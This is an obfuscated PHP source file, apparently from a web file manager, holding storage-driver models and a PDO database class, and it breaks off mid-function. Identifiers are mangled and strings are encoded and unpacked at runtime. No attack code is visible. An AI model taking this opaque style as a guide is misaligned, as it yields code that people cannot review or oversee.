<?php
 goto Dµ²²´É‡º; c‰ôÓ’¦—: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\163\157\165\x72\143\x65\x53\145\x63\162\x65\164\114\x69\x73\x74"; public $field = array("\163\x6f\165\162\x63\x65\111\104", "\164\x79\x70\145\x49\x44", "\143\162\145\x61\164\x65\125\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\163\164\157\162\141\147\x65\114\151\x73\164"; public $field = array("\x6e\141\x6d\145", "\x73\151\x7a\145\x4d\141\170", "\163\171\x73\x74\145\x6d", "\144\x65\x66\x61\165\x6c\164", "\x64\162\151\x76\x65\x72", "\143\157\156\146\x69\x67"); public function listData($¿óİ½ª‰ = false, $æÊæß„ = "\155\157\x64\151\x66\x79\124\x69\155\x65", $‰ŠÒ¤öÑ = false) { $§¹¨òÈ™ =& $_SERVER[ÏÒ Ì„]; $ì…ÊçöÙ = parent::listData($¿óİ½ª‰, $æÊæß„, $‰ŠÒ¤öÑ); if ($¿óİ½ª‰) { return $ì…ÊçöÙ; } $ÃÃùø = $this->ioSizeUseGet(array_to_keyvalue($ì…ÊçöÙ, $§¹¨òÈ™[33], $§¹¨òÈ™[395])); foreach ($ì…ÊçöÙ as $ÛŠı„ => $Õ´œĞ¢õ) { unset($ì…ÊçöÙ[$ÛŠı„][$§¹¨òÈ™[6]]); $ì…ÊçöÙ[$ÛŠı„][$§¹¨òÈ™[1734]] = isset($ÃÃùø[$Õ´œĞ¢õ[$§¹¨òÈ™[395]]]) ? $ÃÃùø[$Õ´œĞ¢õ[$§¹¨òÈ™[395]]] : 0; } return $ì…ÊçöÙ; } public function ioSizeUseGet($›¼Œ¬îÍ) { $Ï‡åªü¥ =& $_SERVER[ÏÒ Ì„]; if (!$›¼Œ¬îÍ) { return array(); } $´‹î¾ññ = $Ï‡åªü¥[2049] . implode($Ï‡åªü¥[47], $›¼Œ¬îÍ); $×ñ—¦Ä€ = Cache::get($´‹î¾ññ); if ($×ñ—¦Ä€) { return $×ñ—¦Ä€; } $¯‚Æ÷âğ = array($Ï‡åªü¥[814] => $Ï‡åªü¥[395], $Ï‡åªü¥[2050] => $Ï‡åªü¥[78]); $Ù…ü¼•« = array($Ï‡åªü¥[814] => array($Ï‡åªü¥[7], $›¼Œ¬îÍ)); $×ñ—¦Ä€ = Model($Ï‡åªü¥[777])->field($¯‚Æ÷âğ)->where($Ù…ü¼•«)->group($Ï‡åªü¥[814])->select(); $×ñ—¦Ä€ = array_to_keyvalue($×ñ—¦Ä€, $Ï‡åªü¥[395], $Ï‡åªü¥[78]); Cache::set($´‹î¾ññ, $×ñ—¦Ä€, 600); return $×ñ—¦Ä€; } public function getConfig($ŞÃı—£Ó) { $İáæ†Ö¼ = parent::listData($ŞÃı—£Ó); return json_decode($İáæ†Ö¼[$_SERVER[ÏÒ Ì„][6]], !0); } public function update($ÇŞ ¨©, $˜«·ü¹Ã) { $öÙÒáîì =& $_SERVER[ÏÒ Ì„]; $ú—ƒ‹š‘ = $˜«·ü¹Ã[$öÙÒáîì[28]]; $±ğŞÔÙá = array_to_keyvalue(parent::listData(), $öÙÒáîì[28]); if (isset($±ğŞÔÙá[$ú—ƒ‹š‘]) && $±ğŞÔÙá[$ú—ƒ‹š‘][$öÙÒáîì[395]] != $ÇŞ ¨©) { return !1; } if (isset($˜«·ü¹Ã[$öÙÒáîì[2051]]) && $˜«·ü¹Ã[$öÙÒáîì[2051]] == $öÙÒáîì[87]) { $this->checkConfig($˜«·ü¹Ã); } unset($˜«·ü¹Ã[$öÙÒáîì[2051]]); $Ï‹¹ûÑ = parent::update($ÇŞ ¨©, $˜«·ü¹Ã); if ($Ï‹¹ûÑ && $˜«·ü¹Ã[$öÙÒáîì[34]]) { foreach ($±ğŞÔÙá as $Ë°ÓÂÉû) { if ($Ë°ÓÂÉû[$öÙÒáîì[34]] && $Ë°ÓÂÉû[$öÙÒáîì[395]] != $ÇŞ ¨©) { parent::update($Ë°ÓÂÉû[$öÙÒáîì[395]], array($öÙÒáîì[34] => 0)); } } } return $Ï‹¹ûÑ; } public function add($áÏä«ß­) { $”„á¾®á =& $_SERVER[ÏÒ Ì„]; $ââîÍ´€ = array_to_keyvalue(parent::listData(), $”„á¾®á[28]); if (isset($ââîÍ´€[$áÏä«ß­[$”„á¾®á[28]]])) { return !1; } $this->checkConfig($áÏä«ß­); $‰«úèË = parent::insert($áÏä«ß­); if ($‰«úèË && $áÏä«ß­[$”„á¾®á[34]]) { foreach ($ââîÍ´€ as $Æá‚Ô¾ê) { if ($Æá‚Ô¾ê[$”„á¾®á[34]]) { parent::update($Æá‚Ô¾ê[$”„á¾®á[395]], array($”„á¾®á[34] => 0)); } } } return $‰«úèË; } public function checkConfig(&$ö”ÑœÓİ, $æï³´˜Ô = false) { $î·½¾º =& $_SERVER[ÏÒ Ì„]; $®¿”°¾ñ = strtolower($ö”ÑœÓİ[$î·½¾º[94]]); $ëŸŠå÷© = json_decode($ö”ÑœÓİ[$î·½¾º[6]], !0); foreach ($ëŸŠå÷© as $ö×î„é¼ => $†å¡åİ¾) { $ëŸŠå÷©[$ö×î„é¼] = trim($†å¡åİ¾); } $ëŸŠå÷©[$î·½¾º[2052]] = rand_string(6); $»‘úŞõÒ = $GLOBALS[$î·½¾º[6]][$î·½¾º[88]][$î·½¾º[823]]; $åÈ£šÍø = isset($»‘úŞõÒ[$®¿”°¾ñ]) ? $»‘úŞõÒ[$®¿”°¾ñ] : ucfirst($®¿”°¾ñ); $ìÙ­èÖØ = $î·½¾º[72] . $åÈ£šÍø; if (!$åÈ£šÍø || !class_exists($ìÙ­èÖØ)) { if ($æï³´˜Ô) { return LNG($î·½¾º[2053]); } write_log(array($î·½¾º[2054], $ö”ÑœÓİ, get_caller_info()), $î·½¾º[2055]); show_json(LNG($î·½¾º[2053]), !1, $ö”ÑœÓİ); } $ôë˜¦› = new $ìÙ­èÖØ($ëŸŠå÷©); if (in_array($®¿”°¾ñ, $ôë˜¦›->objectDriver)) { if (!$ôë˜¦›->isBucketCors() && !$ôë˜¦›->setBucketCors()) { $«¯¤èÀ½ = LNG($î·½¾º[2056]); $«¯¤èÀ½ .= $î·½¾º[2057] . LNG($î·½¾º[2058]); if ($æï³´˜Ô) { return $«¯¤èÀ½; } show_json($«¯¤èÀ½, !1); } } $°±•¢ó‚ = rtrim($ëŸŠå÷©[$î·½¾º[1109]], $î·½¾º[8]) . $î·½¾º[8]; $®çèµóî = $ôë˜¦›->getPath($°±•¢ó‚ . $î·½¾º[1171]); if (!$ôë˜¦›->mkfile($®çèµóî)) { if ($æï³´˜Ô) { return LNG($î·½¾º[2056]); } show_json(LNG($î·½¾º[2056]), !1); } $ëŸŠå÷©[$î·½¾º[1109]] = $°±•¢ó‚; $ö”ÑœÓİ[$î·½¾º[6]] = json_encode($ëŸŠå÷©); $ö”ÑœÓİ[$î·½¾º[94]] = $åÈ£šÍø; return !0; } public function driverListSystem() { $Ïµºœ¢ı =& $_SERVER[ÏÒ Ì„]; $şÙ‰’Ïé = parent::listData(); $´ÒÍ°¸ = array(); foreach ($şÙ‰’Ïé as $‡›Ğ©×Â) { unset($‡›Ğ©×Â[$Ïµºœ¢ı[194]], $‡›Ğ©×Â[$Ïµºœ¢ı[84]]); $‡›Ğ©×Â[$Ïµºœ¢ı[6]] = json_decode($‡›Ğ©×Â[$Ïµºœ¢ı[6]], !0); $´ÒÍ°¸[] = $‡›Ğ©×Â; } return $´ÒÍ°¸; } public function defaultDriver() { $Ä´«ùé =& $_SERVER[ÏÒ Ì„]; $Ï„æ±Å¼ = parent::listData(); $‡Ñ¸“É = array_filter_by_field($Ï„æ±Å¼, $Ä´«ùé[34], 1); $‡Ñ¸“É = $‡Ñ¸“É[0]; if ($‡Ñ¸“É) { $‡Ñ¸“É[$Ä´«ùé[6]] = json_decode($‡Ñ¸“É[$Ä´«ùé[6]], !0); } return $‡Ñ¸“É; } public function driverInfo($íÑı¶á¡) { $ıàËûĞ =& $_SERVER[ÏÒ Ì„]; $š¯÷¿àë = array_to_keyvalue(parent::listData(), $ıàËûĞ[395]); if (!isset($š¯÷¿àë[$íÑı¶á¡])) { return !1; } $ÂËÙ§¥¼ = $š¯÷¿àë[$íÑı¶á¡]; $ÂËÙ§¥¼[$ıàËûĞ[6]] = json_decode($ÂËÙ§¥¼[$ıàËûĞ[6]], !0); return $ÂËÙ§¥¼; } public function remove($¡£Ş‹ôô) { $this->removeShareItems($¡£Ş‹ôô); return parent::remove($¡£Ş‹ôô); } public function removeWithFile($êÍ†Í¥†, $«««Ïı‚) { $îÕèÍîù =& $_SERVER[ÏÒ Ì„]; $å¡öÀƒö = array($îÕèÍîù[814] => $êÍ†Í¥†); $Ğ°© = Model($îÕèÍîù[464])->where($å¡öÀƒö)->count(); $ŠÇáØ¦é = Model($îÕèÍîù[464])->where($å¡öÀƒö)->sum($îÕèÍîù[78]); $‘ÍÔ´é‹ = $«««Ïı‚ . $îÕèÍîù[2059] . $êÍ†Í¥†; $ö“ë’ª™ = new TaskFileTransfer($‘ÍÔ´é‹, $îÕèÍîù[2055], $Ğ°©, LNG($îÕèÍîù[2060]) . "\50{$êÍ†Í¥†}\51"); $ö“ë’ª™->task[$îÕèÍîù[753]] = (double) $ŠÇáØ¦é; $Ÿ£ğçáç = KodIO::defaultDriver(); $åö´§Å = $Ÿ£ğçáç[$îÕèÍîù[395]]; $ÒıÖıë‘ = "\173\151\157\x3a{$åö´§Å}\175\x2f"; $áŠØ™ = !0; $œ–´ÉŠ¸ = array(); $åÜĞÑ¬ = Model($îÕèÍîù[193])->where($å¡öÀƒö)->field($îÕèÍîù[2061])->select(); foreach ($åÜĞÑ¬ as $°ÎÍí¶) { $¤¿°Å— = $°ÎÍí¶[$îÕèÍîù[76]]; $®§û›Ä„ = $ÒıÖıë‘ . str_replace("\173\151\157\72{$êÍ†Í¥†}\175\x2f", $îÕèÍîù[33], $¤¿°Å—); if (!IO::exist($¤¿°Å—)) { $œ–´ÉŠ¸[] = $°ÎÍí¶[$îÕèÍîù[461]]; $ö“ë’ª™->updateFileEnd($°ÎÍí¶[$îÕèÍîù[28]], $°ÎÍí¶[$îÕèÍîù[78]]); continue; } if (IO::exist($®§û›Ä„)) { $ö“ë’ª™->updateFileEnd($°ÎÍí¶[$îÕèÍîù[28]], $°ÎÍí¶[$îÕèÍîù[78]]); continue; } if (!IO::move($¤¿°Å—, get_path_father($®§û›Ä„))) { $áŠØ™ = !1; break; } $å¡öÀƒö = array($îÕèÍîù[461] => $°ÎÍí¶[$îÕèÍîù[461]]); $£Ø°ñÍè = array($îÕèÍîù[814] => $åö´§Å, $îÕèÍîù[76] => $®§û›Ä„); Model($îÕèÍîù[193])->where($å¡öÀƒö)->save($£Ø°ñÍè); } $this->removeByFileID($œ–´ÉŠ¸); if (!$áŠØ™) { $ö“ë’ª™->stop($‘ÍÔ´é‹); return !1; } $ö“ë’ª™->end(); if ($«««Ïı‚ == $îÕèÍîù[1714]) { $this->remove($êÍ†Í¥†); } } public function progress($š°ƒ«â, $ä¿¤£ƒ) { return Task::get($ä¿¤£ƒ . $_SERVER[ÏÒ Ì„][2059] . $š°ƒ«â); } private function removeByFileID($‚Ú¹±ó = array()) { $ÖÙ—ÏçØ =& $_SERVER[ÏÒ Ì„]; if (empty($‚Ú¹±ó)) { return; } $¦àãÍø = array($ÖÙ—ÏçØ[461] => array($ÖÙ—ÏçØ[7], $‚Ú¹±ó)); $Ö¯ÚŒ‘ = Model($ÖÙ—ÏçØ[1251])->where($¦àãÍø)->field($ÖÙ—ÏçØ[397])->select(); if (!$Ö¯ÚŒ‘) { return; } $Ö¯ÚŒ‘ = array_to_keyvalue($Ö¯ÚŒ‘, $ÖÙ—ÏçØ[33], $ÖÙ—ÏçØ[397]); foreach ($Ö¯ÚŒ‘ as $ª ¢®¡ù) { Model($ÖÙ—ÏçØ[411])->removeNow($ª ¢®¡ù, !1); } } private function removeShareItems($ùïáåÓé) { $¦‡‰÷„ =& $_SERVER[ÏÒ Ì„]; $Î¥ğ±Æó = "\173\x69\157\x3a{$ùïáåÓé}\175\x2f"; $Ú—ãØıƒ = array($¦‡‰÷„[397] => 0, $¦‡‰÷„[1104] => array($¦‡‰÷„[381], "{$Î¥ğ±Æó}\45")); $œ¨šËì  = Model($¦‡‰÷„[1725])->where($Ú—ãØıƒ)->field($¦‡‰÷„[482])->select(); if (empty($œ¨šËì )) { return; } $Ï×§øûè = array_to_keyvalue($œ¨šËì , $¦‡‰÷„[33], $¦‡‰÷„[482]); Model($¦‡‰÷„[589])->remove($Ï×§øûè); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x4c\x69\147\x68\x74\x41\160\x70"; public $modelType = "\123\171\x73\164\x65\155\x4f\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x67\162\x6f\x75\x70", "\144\x65\163\143", "\143\x6f\x6e\x74\x65\x6e\x74"); public function listData($­ª‡º™± = false, $œœÅûíÈ = "\155\157\144\x69\146\171\x54\x69\155\145", $½ßå„³ñ = true) { return parent::listData($­ª‡º™±, $œœÅûíÈ, $½ßå„³ñ); } public function remove($©€ş˜ûÊ) { $˜–œí™ö = $this->findByName($©€ş˜ûÊ); if (!$˜–œí™ö) { return !1; } return parent::remove($˜–œí™ö[$_SERVER[ÏÒ Ì„][395]]); } public function add($È€Íá€Î) { if ($this->findByName($È€Íá€Î[$_SERVER[ÏÒ Ì„][28]])) { return !1; } return parent::insert($È€Íá€Î); } public function update($Ò„ò‰–, $ş¾èÀ±) { $®ëûí‰Ø =& $_SERVER[ÏÒ Ì„]; $î£«¿û = $this->findByName($Ò„ò‰–); $ÔŸìé—ı = $this->findByName($ş¾èÀ±[$®ëûí‰Ø[28]]); if (!$î£«¿û || $ÔŸìé—ı && $ÔŸìé—ı[$®ëûí‰Ø[395]] != $î£«¿û[$®ëûí‰Ø[395]]) { return !1; } return parent::update($î£«¿û[$®ëûí‰Ø[395]], $ş¾èÀ±); } } goto a±§öñîª¹; Dç’ãµÕİš: define($_SERVER[ÏÒ Ì„][0], $_SERVER[ÏÒ Ì„][1]); $_SERVER[ïàçÔ¥¥] = explode($_SERVER[ÏÒ Ì„][2], gzinflate(substr($_SERVER[ÏÒ Ì„][3], 10, -8))); function binCheckEq($Ÿ‰„Ê¦Ø, $Í€ÇÎŞ›) { return $Ÿ‰„Ê¦Ø == $Í€ÇÎŞ›; } goto E—â³…††; FˆÜ¢ïÍ¥: define($_SERVER[ÏÒ Ì„][598], $_SERVER[ÏÒ Ì„][599]); $pcavhwrngq = $_SERVER[ÏÒ Ì„][600]; if (!$pcavhwrngq) { return; } goto eÚÔ¥“ö”; bĞñ¦à…ø: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($É–¸Ç”‰ = '') { $Ò›üç—Š =& $_SERVER[ÏÒ Ì„]; if (!class_exists($Ò›üç—Š[910])) { think_exception(think_lang($Ò›üç—Š[10]) . $Ò›üç—Š[911]); } if (!empty($É–¸Ç”‰)) { $this->config = $É–¸Ç”‰; if (empty($this->config[$Ò›üç—Š[13]])) { $this->config[$Ò›üç—Š[13]] = array(); } } } public function connect($Øªƒ•·¥ = '', $““ÁÒ¾ = 0) { $’€„Œä— =& $_SERVER[ÏÒ Ì„]; if (!isset($this->linkID[$““ÁÒ¾])) { if (empty($Øªƒ•·¥)) { $Øªƒ•·¥ = $this->config; } $Ï¼ãåíâ = !empty($Øªƒ•·¥[$’€„Œä—[13]][$’€„Œä—[14]]) ? $Øªƒ•·¥[$’€„Œä—[13]][$’€„Œä—[14]] : $this->pconnect; if ($Ï¼ãåíâ) { $Øªƒ•·¥[$’€„Œä—[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$““ÁÒ¾] = new PDO($Øªƒ•·¥[$’€„Œä—[912]], $Øªƒ•·¥[$’€„Œä—[885]], $Øªƒ•·¥[$’€„Œä—[886]], $Øªƒ•·¥[$’€„Œä—[13]]); } catch (PDOException $®ë£Üı¼) { think_exception($®ë£Üı¼->getMessage()); } $this->dbType = $this->_getDsnType($Øªƒ•·¥[$’€„Œä—[912]]); if (in_array($this->dbType, array($’€„Œä—[913], $’€„Œä—[914], $’€„Œä—[915], $’€„Œä—[916]))) { think_exception($’€„Œä—[917] . $this->dbType . $’€„Œä—[918] . $this->dbType . $’€„Œä—[919]); } if (!$this->linkID[$““ÁÒ¾]) { think_exception($’€„Œä—[920]); } try { $this->linkID[$““ÁÒ¾]->exec($’€„Œä—[921] . think_config($’€„Œä—[888])); } catch (Exception $®ë£Üı¼) { } $this->connected = !0; if (1 != think_config($’€„Œä—[18])) { unset($this->config); } } return $this->linkID[$““ÁÒ¾]; } public function free() { $this->PDOStatement = null; } public function query($¥–õçå†, $‘Ó¦òßÑ = array()) { $ä î¨é« =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥–õçå†; if (!empty($‘Ó¦òßÑ)) { $this->queryStr .= $ä î¨é«[922] . print_r($‘Ó¦òßÑ, !0) . $ä î¨é«[923]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ä î¨é«[19], 1); think_status($ä î¨é«[20]); $this->PDOStatement = $this->_linkID->prepare($¥–õçå†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ŞÕÙº¹ = $this->PDOStatement->execute($‘Ó¦òßÑ); $this->debug(); if (!1 === $ŞÕÙº¹) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($å¥„˜¥è, $ªé½•í• = array()) { $Şêš«ó¿ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $å¥„˜¥è; if (!empty($ªé½•í•)) { $this->queryStr .= $Şêš«ó¿[922] . print_r($ªé½•í•, !0) . $Şêš«ó¿[923]; } $ôäİÓ = !1; if ($this->dbType == $Şêš«ó¿[916]) { if (preg_match($Şêš«ó¿[924], $this->queryStr, $œåÑÉÇã)) { $this->table = think_config($Şêš«ó¿[925]) . str_ireplace(think_config($Şêš«ó¿[926]), $Şêš«ó¿[376], $œåÑÉÇã[2]); $ôäİÓ = (bool) $this->query($Şêš«ó¿[927] . strtoupper($this->table) . $Şêš«ó¿[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Şêš«ó¿[21], 1); think_status($Şêš«ó¿[20]); $this->PDOStatement = $this->_linkID->prepare($å¥„˜¥è); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $²üÈÏ³Ä = $this->PDOStatement->execute($ªé½•í•); $this->debug(); if (!1 === $²üÈÏ³Ä) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ôäİÓ || preg_match($Şêš«ó¿[928], $å¥„˜¥è)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $÷’”Œ¾ = $this->_linkID->commit(); $this->transTimes = 0; if (!$÷’”Œ¾) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $’Õ ˜ìä = $this->_linkID->rollback(); $this->transTimes = 0; if (!$’Õ ˜ìä) { $this->error(); return !1; } } return !0; } private function getAll() { $Ø¢­Ö¤ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ø¢­Ö¤); return $Ø¢­Ö¤; } public function getFields($¬Ü§ê») { $’şÙíé± =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!0); if (think_config($’şÙíé±[929])) { $ëïèÛùõ = str_replace($’şÙíé±[930], $¬Ü§ê», think_config($’şÙíé±[929])); } else { switch ($this->dbType) { case $’şÙíé±[913]: case $’şÙíé±[931]: $ëïèÛùõ = "\x53\x45\x4c\x45\103\124\40\x20\40\143\x6f\x6c\x75\x6d\156\137\156\141\155\145\x20\141\163\x20\x27\x4e\141\x6d\x65\47\54\x20\x20\40\x64\x61\164\x61\137\x74\x79\x70\x65\x20\x61\x73\40\47\124\171\x70\x65\x27\54\x20\x20\x20\143\157\x6c\x75\x6d\x6e\x5f\x64\145\146\x61\165\154\164\40\141\x73\40\x27\104\x65\146\141\165\x6c\x74\x27\54\40\40\40\151\163\137\156\x75\x6c\x6c\141\x62\x6c\x65\x20\x61\163\40\47\116\165\154\154\47\xa\x9\11\x46\x52\117\x4d\11\x69\156\146\x6f\x72\x6d\141\164\151\x6f\x6e\x5f\163\143\150\145\155\141\x2e\164\x61\142\154\x65\163\40\101\x53\40\x74\xa\11\11\112\x4f\x49\x4e\11\151\156\146\157\x72\x6d\x61\x74\151\x6f\156\x5f\x73\x63\150\x65\155\x61\x2e\143\x6f\x6c\x75\x6d\156\x73\40\101\123\x20\x63\xa\11\11\x4f\116\40\x20\164\x2e\164\x61\x62\154\145\137\x63\141\x74\141\154\x6f\x67\x20\x3d\x20\x63\56\x74\141\x62\x6c\x65\137\x63\141\x74\x61\x6c\x6f\147\12\x9\x9\x41\116\x44\40\x74\56\x74\141\142\154\145\x5f\163\x63\x68\x65\x6d\x61\x20\x3d\40\x63\56\164\141\142\154\x65\137\163\x63\150\145\x6d\141\xa\x9\11\101\116\104\x20\164\x2e\x74\141\142\154\145\x5f\x6e\x61\x6d\x65\40\75\40\x63\x2e\x74\141\142\x6c\x65\x5f\156\x61\x6d\145\12\x9\11\127\x48\x45\122\x45\40\40\40\x74\x2e\x74\x61\x62\x6c\145\x5f\x6e\141\x6d\145\40\75\x20\47{$¬Ü§ê»}\47"; break; case $’şÙíé±[932]: $ëïèÛùõ = $’şÙíé±[933] . $¬Ü§ê» . $’şÙíé±[934]; break; case $’şÙíé±[914]: case $’şÙíé±[916]: $ëïèÛùõ = $’şÙíé±[935] . $’şÙíé±[936] . $’şÙíé±[937] . strtoupper($¬Ü§ê») . $’şÙíé±[938] . strtoupper($¬Ü§ê») . $’şÙíé±[939]; break; case $’şÙíé±[940]: $ëïèÛùõ = $’şÙíé±[941] . $¬Ü§ê» . $’şÙíé±[942]; break; case $’şÙíé±[915]: break; case $’şÙíé±[943]: default: $ëïèÛùõ = $’şÙíé±[944] . ($this->dbType == $’şÙíé±[943] ? "\x60{$¬Ü§ê»}\140" : $¬Ü§ê»); } } $ÑïŸâÏ” = $this->query($ëïèÛùõ); $èªÒñû™ = array(); if ($ÑïŸâÏ”) { foreach ($ÑïŸâÏ” as $Ò£÷â¤¡ => $ª—‰ôîÃ) { $ª—‰ôîÃ = array_change_key_case($ª—‰ôîÃ); $ª—‰ôîÃ[$’şÙíé±[28]] = isset($ª—‰ôîÃ[$’şÙíé±[28]]) ? $ª—‰ôîÃ[$’şÙíé±[28]] : $’şÙíé±[376]; $ª—‰ôîÃ[$’şÙíé±[29]] = isset($ª—‰ôîÃ[$’şÙíé±[29]]) ? $ª—‰ôîÃ[$’şÙíé±[29]] : $’şÙíé±[376]; $éòĞØåË = isset($ª—‰ôîÃ[$’şÙíé±[271]]) ? $ª—‰ôîÃ[$’şÙíé±[271]] : $ª—‰ôîÃ[$’şÙíé±[28]]; $èªÒñû™[$éòĞØåË] = array($’şÙíé±[28] => $éòĞØåË, $’şÙíé±[29] => $ª—‰ôîÃ[$’şÙíé±[29]], $’şÙíé±[31] => (bool) (isset($ª—‰ôîÃ[$’şÙíé±[103]]) && $ª—‰ôîÃ[$’şÙíé±[103]] === $’şÙíé±[33] || isset($ª—‰ôîÃ[$’şÙíé±[31]]) && $ª—‰ôîÃ[$’şÙíé±[31]] === $’şÙíé±[33]), $’şÙíé±[34] => isset($ª—‰ôîÃ[$’şÙíé±[34]]) ? $ª—‰ôîÃ[$’şÙíé±[34]] : (isset($ª—‰ôîÃ[$’şÙíé±[53]]) ? $ª—‰ôîÃ[$’şÙíé±[53]] : $’şÙíé±[376]), $’şÙíé±[36] => isset($ª—‰ôîÃ[$’şÙíé±[93]]) ? strtolower($ª—‰ôîÃ[$’şÙíé±[93]]) == $’şÙíé±[38] : (isset($ª—‰ôîÃ[$’şÙíé±[54]]) ? $ª—‰ôîÃ[$’şÙíé±[54]] : !1), $’şÙíé±[39] => isset($ª—‰ôîÃ[$’şÙíé±[945]]) ? strtolower($ª—‰ôîÃ[$’şÙíé±[945]]) == $’şÙíé±[41] : (isset($ª—‰ôîÃ[$’şÙíé±[93]]) ? $ª—‰ôîÃ[$’şÙíé±[93]] : !1)); } } return $èªÒñû™; } public function getTables($ş´€Ş´Š = '') { $Áóä­Ç =& $_SERVER[ÏÒ Ì„]; if (think_config($Áóä­Ç[946])) { $è‡ÌÓŸÙ = str_replace($Áóä­Ç[947], $ş´€Ş´Š, think_config($Áóä­Ç[946])); } else { switch ($this->dbType) { case $Áóä­Ç[914]: case $Áóä­Ç[916]: $è‡ÌÓŸÙ = $Áóä­Ç[948]; break; case $Áóä­Ç[913]: case $Áóä­Ç[931]: $è‡ÌÓŸÙ = $Áóä­Ç[949]; break; case $Áóä­Ç[940]: $è‡ÌÓŸÙ = $Áóä­Ç[950]; break; case $Áóä­Ç[915]: think_exception(think_lang($Áóä­Ç[951]) . $Áóä­Ç[952]); break; case $Áóä­Ç[932]: $è‡ÌÓŸÙ = $Áóä­Ç[42] . $Áóä­Ç[43] . $Áóä­Ç[44]; break; case $Áóä­Ç[943]: default: if (!empty($ş´€Ş´Š)) { $è‡ÌÓŸÙ = $Áóä­Ç[896] . $ş´€Ş´Š . $Áóä­Ç[897]; } else { $è‡ÌÓŸÙ = $Áóä­Ç[898]; } } } $ÀéüÎßÉ = $this->query($è‡ÌÓŸÙ); $öƒÛëÒ­ = array(); foreach ($ÀéüÎßÉ as $Û€Ÿ™Öö => $ÇÍ‹Ê´) { $öƒÛëÒ­[$Û€Ÿ™Öö] = current($ÇÍ‹Ê´); } return $öƒÛëÒ­; } protected function parseLimit($†Ì‡ªÇà) { $¿æİ˜¬ =& $_SERVER[ÏÒ Ì„]; $êÎœíæÏ = $¿æİ˜¬[33]; if (!empty($†Ì‡ªÇà)) { switch ($this->dbType) { case $¿æİ˜¬[940]: case $¿æİ˜¬[932]: $†Ì‡ªÇà = explode($¿æİ˜¬[47], $†Ì‡ªÇà); if (count($†Ì‡ªÇà) > 1) { $êÎœíæÏ .= $¿æİ˜¬[48] . $†Ì‡ªÇà[1] . $¿æİ˜¬[49] . $†Ì‡ªÇà[0] . $¿æİ˜¬[50]; } else { $êÎœíæÏ .= $¿æİ˜¬[48] . $†Ì‡ªÇà[0] . $¿æİ˜¬[50]; } break; case $¿æİ˜¬[913]: case $¿æİ˜¬[931]: break; case $¿æİ˜¬[915]: break; case $¿æİ˜¬[914]: case $¿æİ˜¬[916]: break; case $¿æİ˜¬[943]: default: $êÎœíæÏ .= $¿æİ˜¬[48] . $†Ì‡ªÇà . $¿æİ˜¬[50]; } } return $êÎœíæÏ; } public function parseKey(&$¬’Ï·ÉØ, $»’ÙßÏÒ = true) { $şüªœ =& $_SERVER[ÏÒ Ì„]; if ($»’ÙßÏÒ) { $¬’Ï·ÉØ = $this->parseKeyCheck($¬’Ï·ÉØ); } if ($this->dbType == $şüªœ[943]) { if ($¬’Ï·ÉØ != $şüªœ[182] && !preg_match($şüªœ[908], $¬’Ï·ÉØ)) { $¬’Ï·ÉØ = $şüªœ[383] . trim($¬’Ï·ÉØ, $şüªœ[383]) . $şüªœ[383]; } return $¬’Ï·ÉØ; } else { return parent::parseKey($¬’Ï·ÉØ, $»’ÙßÏÒ); } } public function close() { $this->_linkID = null; } public function error() { $Ã¯È“¡Ÿ =& $_SERVER[ÏÒ Ì„]; if ($this->PDOStatement) { $Ş×™€» = $this->PDOStatement->errorInfo(); $this->error = $Ş×™€»[1] . $Ã¯È“¡Ÿ[4] . $Ş×™€»[2]; } else { $this->error = $Ã¯È“¡Ÿ[33]; } if ($Ã¯È“¡Ÿ[33] != $this->queryStr) { $this->error .= LNG($Ã¯È“¡Ÿ[45]) . $this->queryStr; } think_trace($this->error, $Ã¯È“¡Ÿ[33], $Ã¯È“¡Ÿ[46]); return $this->error; } public function escapeString($˜šö€ü) { $¢¼¿ä« =& $_SERVER[ÏÒ Ì„]; switch ($this->dbType) { case $¢¼¿ä«[940]: case $¢¼¿ä«[913]: case $¢¼¿ä«[931]: case $¢¼¿ä«[943]: return addslashes($˜šö€ü); case $¢¼¿ä«[915]: case $¢¼¿ä«[932]: case $¢¼¿ä«[914]: case $¢¼¿ä«[916]: return str_ireplace($¢¼¿ä«[55], $¢¼¿ä«[56], $˜šö€ü); } } protected function parseValue($›İ¦‹ ) { $Ûß´êò… =& $_SERVER[ÏÒ Ì„]; if (is_string($›İ¦‹ )) { $ûæ½Ïšµ = strpos($›İ¦‹ , $Ûß´êò…[4]) === 0 && in_array($›İ¦‹ , array_keys($this->bind)); $›İ¦‹  = $ûæ½Ïšµ ? $this->escapeString($›İ¦‹ ) : $Ûß´êò…[953] . $this->escapeString($›İ¦‹ ) . $Ûß´êò…[953]; } elseif (isset($›İ¦‹ [0]) && is_string($›İ¦‹ [0]) && strtolower($›İ¦‹ [0]) == $Ûß´êò…[295]) { $›İ¦‹  = $this->escapeString($›İ¦‹ [1]); } elseif (is_array($›İ¦‹ )) { $›İ¦‹  = array_map(array($this, $Ûß´êò…[954]), $›İ¦‹ ); } elseif (is_bool($›İ¦‹ )) { $›İ¦‹  = $›İ¦‹  ? $Ûß´êò…[87] : $Ûß´êò…[191]; } elseif (is_null($›İ¦‹ )) { $›İ¦‹  = $Ûß´êò…[103]; } return $›İ¦‹ ; } public function getLastInsertId() { 